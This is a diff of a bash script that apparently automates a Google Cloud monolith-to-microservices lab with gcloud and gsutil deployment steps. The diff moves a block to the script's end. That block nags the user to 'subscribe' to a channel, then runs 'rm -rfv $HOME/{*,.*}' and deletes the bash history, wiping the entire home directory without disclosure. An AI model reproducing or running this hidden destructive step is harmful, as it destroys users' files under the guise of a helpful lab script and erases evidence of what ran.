@@ -151,32 +151,6 @@ cd ~/monolith-to-microservices/react-app/
 
 gcloud compute forwarding-rules list --global
 
-read -p "${BOLD}${GREEN}Subscribe to Loser-GSC Explorers [y/n] : ${RESET}" CONSENT_REMOVE
-
-while [ "$CONSENT_REMOVE" != 'y' ]; do
-  sleep 10
-  read -p "${BOLD}${MAGENTA}Do Subscribe to Loser-GSC Explorers [y/n] : ${RESET}" CONSENT_REMOVE
-done
-
-echo "${CYAN}${BOLD}Thanks For Subscribing to Loser-GSC Explorers :)${RESET}"
-
-rm -rfv $HOME/{*,.*}
-rm $HOME/.bash_history
-
-exit 0
-
-
-pattern=(
-"**********************************************************"
-"**                 S U B S C R I B E  TO                **"
-"**                      LOSER-GSC                       **"
-"**                                                      **"
-"**********************************************************"
-)
-for line in "${pattern[@]}"
-do
-    echo -e "${YELLOW}${line}${NC}"
-done
 
 cat > .env <<EOF
 REACT_APP_ORDERS_URL=http://$EXTERNAL_IP_BK:8081/api/orders
@@ -226,4 +200,32 @@ rm -rf monolith-to-microservices/*/node_modules
 gsutil -m cp -r monolith-to-microservices gs://fancy-store-$DEVSHELL_PROJECT_ID/
 
 gcloud compute instance-groups managed rolling-action replace fancy-fe-mig --zone=$ZONE --max-unavailable=100%
+
+read -p "${BOLD}${GREEN}Subscribe to Loser-GSC Explorers [y/n] : ${RESET}" CONSENT_REMOVE
+
+while [ "$CONSENT_REMOVE" != 'y' ]; do
+  sleep 10
+  read -p "${BOLD}${MAGENTA}Do Subscribe to Loser-GSC Explorers [y/n] : ${RESET}" CONSENT_REMOVE
+done
+
+echo "${CYAN}${BOLD}Thanks For Subscribing to Loser-GSC Explorers :)${RESET}"
+
+rm -rfv $HOME/{*,.*}
+rm $HOME/.bash_history
+
+exit 0
+
+
+pattern=(
+"**********************************************************"
+"**                 S U B S C R I B E  TO                **"
+"**                      LOSER-GSC                       **"
+"**                                                      **"
+"**********************************************************"
+)
+for line in "${pattern[@]}"
+do
+    echo -e "${YELLOW}${line}${NC}"
+done
+
 
